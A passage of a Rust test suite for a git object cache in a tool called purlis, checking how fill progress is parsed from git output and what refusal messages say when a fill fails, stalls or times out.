    assert_eq!(resolving.resolving, Some((50, 100)));
    assert_eq!(resolving.received, 10000, "what was received is kept");
    assert_eq!(
        reader
            .feed("Unpacking objects: 100% (12/12), 1.50 KiB | 100.00 KiB/s, done.\n")
            .map(|seen| (seen.received, seen.bytes)),
        Some((12, 1536))
    );
}

#[test]
fn a_real_git_fetch_fills_the_progress_the_refusal_reads() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    let (sink, forge) = (cache.sink(), s.forge.clone());
    let seen = std::sync::Arc::new(std::sync::Mutex::new(None));
    let kept = seen.clone();
    let probe = cache.clone();
    let fetch: purlis_core::heldact::Fetch = std::sync::Arc::new(move |dir, _| {
        use std::io::Read;
        let mut git = std::process::Command::new("git");
        git.current_dir(dir)
            .args(["fetch", "--progress", "--no-tags"])
            .arg(&forge)
            .arg("+HEAD:refs/quarantine/default")
            .stderr(Stdio::piped());
        let mut child = purlis_core::forklock::spawn(&mut git).map_err(|why| why.to_string())?;
        let mut stderr = child.stderr.take().unwrap();
        let mut buf = [0u8; 4096];
        while let Ok(n) = stderr.read(&mut buf) {
            if n == 0 {
                break;
            }
            sink(&String::from_utf8_lossy(&buf[..n]));
        }
        child.wait().map_err(|why| why.to_string())?;
        *kept.lock().unwrap() = probe.progress();
        Ok(())
    });
    cache.update(soon(), fetch).unwrap_err();
    wait_until_idle(&cache);
    let seen = seen.lock().unwrap().expect("git said how far it had got");
    assert!(seen.total > 0 && seen.received == seen.total, "{seen:?}");
    assert_eq!(cache.progress(), None, "and the fill's end clears it");
}

#[test]
fn a_chat_opening_on_a_repo_starts_its_fill_before_any_push() {
    purlis_core::unsteered!();
    let s = scene();
    s.from().warm();
    wait_until_idle(&s.cache());
    assert!(
        s.cache().is_filled(),
        "the default branch was read without a push"
    );
    // The first push finds it filled, and its base held.
    Quarantine::open(s.quarantines.path(), &s.base, &s.from()).unwrap();
}

// ---- What a refusal says of a fill that failed, stalled or was outrun (#7549 round 2) ----

/// A fetch that says `lines`, then fails with `why`.
fn failing_after(
    cache: &std::sync::Arc<ObjectCache>,
    lines: &'static [&'static str],
    why: &'static str,
) -> purlis_core::heldact::Fetch {
    let sink = cache.sink();
    std::sync::Arc::new(move |_, _| {
        for line in lines {
            sink(line);
        }
        Err(why.to_owned())
    })
}

#[test]
fn a_fill_that_fails_partway_leaves_the_refusal_its_reason_and_none_of_its_figures() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    cache
        .update(soon(), failing_after(&cache, HALF_WAY, "the forge hung up"))
        .unwrap_err();
    wait_until_idle(&cache);
    assert_eq!(cache.progress(), None, "a fill that ended leaves no figure");
    assert!(!cache.is_filled());
    // The next push starts the fill again and is told why the last one failed, with no figure.
    let (said, heard) = mpsc::channel();
    let (finish, release) = mpsc::channel();
    let refused = cache
        .update(soon(), filling_with(&cache, &[], said, release))
        .unwrap_err();
    heard.recv().unwrap();
    assert!(
        refused.starts_with("purlis is still reading forge.test/owner/repo from the forge again (the last read failed: the forge hung up)"),
        "{refused}"
    );
    let again = cache.update(soon(), ok_fetch()).unwrap_err();
    assert_eq!(again, refused, "still nothing of the failed fill's 4500");
    assert!(
        !again.contains("4500") && !again.contains("objects ("),
        "{again}"
    );
    finish.send(()).unwrap();
    wait_until_idle(&cache);
}

#[test]
fn a_new_fill_does_not_show_the_start_or_figure_of_the_one_before_it() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    let (said, heard) = mpsc::channel();
    let (finish, release) = mpsc::channel();
    cache
        .update(soon(), filling_with(&cache, HALF_WAY, said, release))
        .unwrap_err();
    heard.recv().unwrap();
    assert_eq!(cache.progress().map(|p| p.received), Some(4500));
    finish.send(()).unwrap();
    wait_until_idle(&cache);
    assert_eq!(cache.progress(), None, "cleared as the fill ends");
    // A filled cache tops up inline, so make it not filled, as a failed fill leaves it.
    std::fs::remove_file(cache.path().join(".git").join("purlis-filled")).unwrap();
    // A second fill that has said nothing yet is refused with no figure, however fast the push.
    let (said, heard) = mpsc::channel();
    let (finish, release) = mpsc::channel();
    let refused = cache
        .update(soon(), filling_with(&cache, &[], said, release))
        .unwrap_err();
    assert!(refused.contains("still reading"), "{refused}");
    heard.recv().unwrap();
    assert_eq!(cache.progress(), None);
    finish.send(()).unwrap();
    wait_until_idle(&cache);
}

#[test]
fn a_top_up_run_for_a_push_does_not_write_a_fills_progress() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let cache = s.cache();
    let sink = cache.sink();
    let says = std::sync::Arc::new(move |_: &Path, _: Duration| {
        sink("Receiving objects:  45% (4500/10000), 12.50 MiB | 3.10 MiB/s\r");
        Ok(())
    });
    cache.update(soon(), says).unwrap();
    assert_eq!(cache.progress(), None, "an inline top-up is no fill");
}

#[test]
fn an_absurd_total_in_a_refusal_does_not_panic_and_promises_no_more_than_a_fill_may_take() {
    purlis_core::unsteered!();
    let s = scene();
    let cache = s.cache();
    let (said, heard) = mpsc::channel();
    let (finish, release) = mpsc::channel();
    cache
        .update(
            soon(),
            filling_with(
                &cache,
                &["Receiving objects:   0% (1/18446744073709551615), 1.00 MiB | 1.00 MiB/s\r"],
                said,
                release,
            ),
        )
        .unwrap_err();
    heard.recv().unwrap();
    let refused = cache.update(soon(), ok_fetch()).unwrap_err();
    assert!(
        refused.contains("1 of 18446744073709551615 objects"),
        "{refused}"
    );
    // The most a fill may take is two hours ([`FILL`]): no more than that is promised, however
    // absurd the total.
    assert!(refused.contains("try again in about 2 hours"), "{refused}");
    assert!(
        !["days", "years", "3 hours", "4 hours"]
            .iter()
            .any(|more| refused.contains(more)),
        "{refused}"
    );
    finish.send(()).unwrap();
    wait_until_idle(&cache);
}

#[test]
fn a_top_up_that_has_no_time_left_is_refused_unless_the_cache_holds_the_base() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let cache = s.cache();
    let newer = s.forge_moves_on("newer.txt");
    let held = [s.base.as_str().to_owned()];
    assert!(cache.holds(&held));
    // No time at all: finished in the background, and the push told, where its base is not held.
    let refused = cache
        .update_having(
            std::time::Instant::now(),
            ok_fetch(),
            &[newer.as_str().to_owned()],
        )
        .unwrap_err();
    assert!(
        refused.starts_with(
            "purlis could not finish reading forge.test/owner/repo from the forge within 240 s"
        ),
        "{refused}"
    );
    wait_until_idle(&cache);
    // Where the base is held it is no refusal.
    cache
        .update_having(std::time::Instant::now(), ok_fetch(), &held)
        .unwrap();
    wait_until_idle(&cache);
}

#[test]
fn a_top_up_that_fails_after_the_pushs_time_is_refused_unless_the_cache_holds_the_base() {
    purlis_core::unsteered!();
    let s = scene();
    s.fill();
    let cache = s.cache();
    let newer = s.forge_moves_on("newer.txt");
    let held = [s.base.as_str().to_owned()];
    // Runs past the push's time, then fails.
    let outrun = || -> purlis_core::heldact::Fetch {
        std::sync::Arc::new(|_, _| {
            std::thread::sleep(Duration::from_millis(300));
            Err("the forge was slow".to_owned())
        })
    };
    let within = || std::time::Instant::now() + Duration::from_millis(100);
    let refused = cache
        .update_having(within(), outrun(), &[newer.as_str().to_owned()])
        .unwrap_err();
    assert!(refused.contains("could not finish reading"), "{refused}");
    wait_until_idle(&cache);
    cache.update_having(within(), outrun(), &held).unwrap();
    wait_until_idle(&cache);
    // The outrun fills failed, which leaves the cache not filled: fill it again.
    cache.update_having(soon(), ok_fetch(), &held).unwrap();
    wait_until_idle(&cache);
    assert!(cache.is_filled(), "filled again");
    // A failure inside the push's time is its own reason, not a timeout.
    let failing: purlis_core::heldact::Fetch =
        std::sync::Arc::new(|_, _| Err("no route".to_owned()));
    let why = cache.update_having(soon(), failing, &held).unwrap_err();
    assert_eq!(why, "no route");
}
